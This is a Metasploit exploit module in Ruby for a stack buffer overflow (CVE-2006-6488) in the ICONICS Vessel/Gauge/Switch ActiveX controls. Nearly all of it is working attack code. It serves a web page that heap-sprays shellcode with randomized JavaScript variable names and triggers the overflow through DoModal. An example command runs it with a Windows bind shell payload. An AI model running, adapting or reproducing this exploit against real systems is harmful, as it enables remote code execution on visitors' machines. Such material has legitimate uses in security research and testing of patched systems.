ICONICS Vessel / Gauge / Switch 8.02.140 ActiveX BOF Exploit (meta)
===================================================================

##
# $Id: iconics_dlgwrapper.rb 1 2008-09-21 22:43:00Z kf $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##
#
# $ msfcli exploit/windows/browser/iconics_dlgwrapper RHOST=10.211.55.6 PAYLOAD=windows/shell_bind_tcp E

require &#039;msf/core&#039;

module Msf

class Exploits::Windows::Browser::Iconics_Dlgwrapper < Msf::Exploit::Remote

	include Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			&#039;Name&#039;           => &#039;ICONICS Vessel / Gauge / Switch 8.02.140 ActiveX DoModal Overflow&#039;,
			&#039;Description&#039;    => %q{
					This module exploits a stack overflow in the Iconics Vessel / Gauge / Switch ActiveX controls
			},
			&#039;License&#039;        => MSF_LICENSE,
			&#039;Author&#039;         => [ &#039;tebo&#039;, &#039;kf&#039; ], 
			&#039;Version&#039;        => &#039;$Revision: 2 $&#039;,
			&#039;References&#039;     => 
				[
					[ &#039;URL&#039;, &#039;http://www.kb.cert.org/vuls/id/251969&#039; ],
					[ &#039;URL&#039;, &#039;http://www.securityfocus.com/bid/21849/info&#039; ],
					[ &#039;URL&#039;, &#039;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-6488&#039; ],
					[ &#039;URL&#039;, &#039;http://www.iconics.com/support/free_tools/FreeToolsActiveX_DlgWrapperHotFix.zip&#039; ],
				],
			&#039;DefaultOptions&#039; =>
				{
					&#039;EXITFUNC&#039; => &#039;thread&#039;,
				},
			&#039;Payload&#039;        =>
				{
					&#039;BadChars&#039;      => "\x00",
					&#039;StackAdjustment&#039; => -3500,
				},
			&#039;Platform&#039;       => &#039;win&#039;,
			&#039;Targets&#039;        =>
				[
					# This most likely works with Switch and Gauge ActiveX controls as well 
					# Thanks for the target testing tebo. Verified on 2kSP4, XPSP0, XPSP2, XPSP3 
					[ &#039;ICONICS Vessel ActiveX 8.02.140 - Universal EIP hit&#039;, { &#039;Payload&#039; => { &#039;Space&#039; => 412 } } ],
				],
			&#039;DisclosureDate&#039; => &#039;Jan 10 2007&#039;,
			&#039;DefaultTarget&#039;  => 0))
	end

	def on_request_uri(cli, request)
                # Re-generate the payload  
                return if ((p = regenerate_payload(cli)) == nil)
                # Encode the shellcode
                shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

                # Randomize the javascript variable names
                var_i  = rand_text_alpha(rand(30)  + 2)
                rand1  = rand_text_alpha(rand(100) + 1)
                rand2  = rand_text_alpha(rand(100) + 1)
                rand3  = rand_text_alpha(rand(100) + 1)
                rand4  = rand_text_alpha(rand(100) + 1)
                rand5  = rand_text_alpha(rand(100) + 1)
                rand6  = rand_text_alpha(rand(100) + 1)
                rand7  = rand_text_alpha(rand(100) + 1)
                rand8  = rand_text_alpha(rand(100) + 1)
                rand9  = rand_text_alpha(rand(100) + 1)
		rand10 = Rex::Text.to_unescape(rand_text_alpha(1), Rex::Arch.endian(target.arch))

		idname	= "DlgWrapper"
		targetname	= rand_text_alpha(rand(100) + 1)

		content = %Q|
			<html>
			<object classid=&#039;clsid:9d6bd878-b8eb-47e5-ab1c-87d74173baa&#039; id=&#039;#{idname}&#039;></object>
			<script language=&#039;javascript&#039;>
			// begin skylined technique - use the common MSF randomized version.
			var #{rand1} = unescape(&#039;#{shellcode}&#039;);
			var #{rand2} = unescape("%u0d0d%u0d0d");	// unicode nops.... 
			var #{rand3} = 20;
			var #{rand4} = #{rand3} + #{rand1}.length;
			while (#{rand2}.length < #{rand4}) #{rand2} += #{rand2};
			var #{rand5} = #{rand2}.substring(0,#{rand4});
			var #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4});
			while (#{rand6}.length + #{rand4} < 0x40000) #{rand6} = #{rand6} + #{rand6} + #{rand5};
			var #{rand7} = new Array();  
			for (#{var_i} = 0; #{var_i} < 500; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} };
			var #{rand8} = "";
			for (#{var_i} = 0; #{var_i} < #{payload_space}; #{var_i}++) { #{rand8} = #{rand8} + unescape("#{rand10}") };
			#{rand8} = #{rand8} + unescape("%0c%0c%0c%0c"); // Return address for the heap sprayed nop sled
			var #{targetname} = new ActiveXObject("#{idname}.BrowseFile.1");
			#{targetname}.DoModal(#{rand8},"#{rand9}");   // Trigger line
			</script>
			</html>
                  |
		
		print_status("Note: The free ActiveX Controls (Gauge, Switch & Vessel) have a hotfix available.")
		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")
		send_response_html(cli, content)
		handler(cli)
	end

end
end



